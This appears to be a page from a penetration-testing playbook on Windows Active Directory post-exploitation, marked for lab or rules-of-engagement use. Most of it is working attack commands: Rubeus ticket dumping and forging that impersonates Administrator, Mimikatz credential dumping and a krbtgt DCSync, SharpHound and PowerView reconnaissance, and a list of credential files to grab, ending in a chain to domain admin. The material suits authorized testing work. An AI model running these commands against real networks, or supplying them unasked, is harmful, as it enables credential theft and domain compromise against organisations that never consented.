# On-host (senior)

Only after a shell (`shells.md`). Kali-side LSASS (`nxc -M lsassy`) is cleaner — try that first.

Public tools only. No custom beacons. Lab / RoE.

## Rubeus

```
# on the box (or via evil-winrm upload)
Rubeus.exe triage
Rubeus.exe dump /nowrap
Rubeus.exe tgtdeleg /nowrap                  # if you are on an unconstrained host
Rubeus.exe asktgt /user:X /rc4:NTHASH /ptt
Rubeus.exe s4u /user:FAKE$ /rc4:NTHASH /impersonateuser:Administrator \
  /msdsspn:cifs/{{DC_FQDN}} /ptt
```

`tgtdeleg` is the unconstrained play after you coerced a DC (`relay.md`).

## Mimikatz

```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export
lsadump::dcsync /domain:{{DOMAIN}} /user:krbtgt
lsadump::lsa /patch
```

Prefer **secretsdump from Kali** over `lsadump::dcsync` from a noisy implant.
`sekurlsa` dies on Credential Guard / Protected Users. Tickets may still be in memory — Rubeus dump.

## SharpHound / PowerView

```
SharpHound.exe -c All --zipfilename loot.zip
# or the nxc / bloodhound-python collector from Kali — prefer Kali

# PowerView only when you already have a PS session and no BH zip
Get-DomainUser -SPN
Get-DomainComputer -Unconstrained
Get-DomainGPO
Find-LocalAdminAccess
```

Do not reinvent BloodHound in PowerView if the zip already collected.

## Files worth grabbing

`C:\Windows\System32\config\SAM` (offline, if you can) · IIS `web.config` ·
unattend.xml · SYSVOL scripts you already spidered · Service account
`HKLM\SOFTWARE\...` passwords · Scheduled task XML.

## Fail → next

| Symptom | Next |
| --- | --- |
| `privilege::debug` fails | not local admin, or LSASS PPL. lsassy from Kali / nanodump variants if in RoE |
| Credential Guard | tickets + registry, not plaintext |
| Defender eats Rubeus | stay on Kali Impacket. do not start packing crypters |
| SharpHound huge / dies | collect from Kali with `-ns` |

## Chain

Shell → (not local admin? `lpe.md` — SeImpersonate/SeBackup → SYSTEM) →
lsassy/Rubeus dump → DA cred/ticket → secretsdump from Kali.
On-host is a fallback, not the plan.
